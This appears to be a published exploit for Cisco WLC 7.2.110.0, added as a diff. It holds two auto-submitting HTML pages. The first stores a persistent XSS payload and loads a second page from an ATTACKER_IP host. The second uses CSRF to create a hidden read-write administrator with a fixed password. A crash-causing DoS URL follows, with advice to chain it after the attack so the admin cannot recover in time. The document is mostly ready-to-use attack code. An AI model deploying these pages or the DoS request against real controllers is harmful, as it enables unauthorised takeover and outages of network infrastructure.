@@ -1,0 +1,71 @@
+-CSRF/XSS-
+ 
+File #1: ciscoWLC1.html
+ 
+ 
+<html>
+<title>Cisco WLC 7.2.110.0 CSRF - Persistent XSS</title>
+<body>
+ 
+<h1>LOADING...</h1>
+ 
+<form name="ciscoXSS" action="https://WLC_IP_HERE/screens/base/web_auth_custom.html" method="post" >
+<input type="hidden" name="access_control" value="1"/>
+<input type="hidden" name="webauth_type" value="internal"/>
+<input type="hidden" name="redirect_url" value=""/>
+<input type="hidden" name="aire_logo" value="show"/>
+<input type="hidden" name="headline" value="HaXoReD<img+src=><script>alert(42)</script>>"/>
+<input type="hidden" name="message" value="U+mAd?<img src=http://www.memes.at/faces/u_mad_troll.gif height=1000 width=1000 align=left>"/>
+<input type="hidden" name="ext_webauth_url" value=""/>
+<input type="hidden" name="buttonClicked" value="4"/>
+<input type="hidden" name="indexedClicked" value="0"/>
+<input type="hidden" name="err_flag" value="0"/>
+<input type="hidden" name="err_msg" value=""/>
+</form>
+ 
+<script>
+function CSRF() {window.open("http://ATTACKER_IP/ciscoWLC2.html")};window.setTimeout(CSRF,1000)
+function XSS() {document.ciscoXSS.submit()};window.setTimeout(XSS,1000)
+</script>
+ 
+</body>
+</html>
+ 
+ 
+ 
+File #2: ciscoWLC2.html
+ 
+ 
+<html>
+<title>Cisco WLC 7.2.110.0 CSRF - Add Administrator</title>
+<body>
+ 
+<form name="ciscoCSRF" action="https://WLC_IP_HERE/screens/aaa/mgmtuser_create.html" method="post" >
+<input type="hidden" name="access_control" value="1"/>
+<input type="hidden" name="username" value="Gimppy"/>
+<input type="hidden" name="userpwd" value="Pwnd123"/>
+<input type="hidden" name="pwdconfirm" value="Pwnd123"/>
+<input type="hidden" name="access_mode" value="readwrite"/>
+<input type="hidden" name="buttonClicked" value="4"/>
+</form>
+ 
+<script>
+document.ciscoCSRF.submit()
+window.open("https://WLC_IP_HERE/screens/base/login_preview.html") <-- Or https://WLC_IP_HERE/login.html
+</script>
+ 
+</body>
+</html>
+ 
+ 
+ 
+--Bug--
+ 
+DoS - Denial of Service
+ 
+If a GET request is made to the URL listed below with the supplied HTML parameters, the Cisco WLC will crash and perform a cold start. The request requires authentication, so you would have to target a specific authenticated user using social engineering tactics, and get them to some how submit the request to the WLC. This DoS GET
+request could be used in conjunction with my demonstrated chained POC exploit above using the persistent XSS vulnerability to crash the WLC after performing the initial attack. This would
+prevent an admin from quickly undoing the changes that were made during the attack, and if the attacker was quick enough to get shell or web access on the WLC before the admin after
+the WLC reboot, the attacker could change the admin password to prevent further access.
+ 
+DoS URL: https://WLC_IP_HERE/screens/base/web_auth_custom.html?&webauth_type=internal&buttonClicked=4
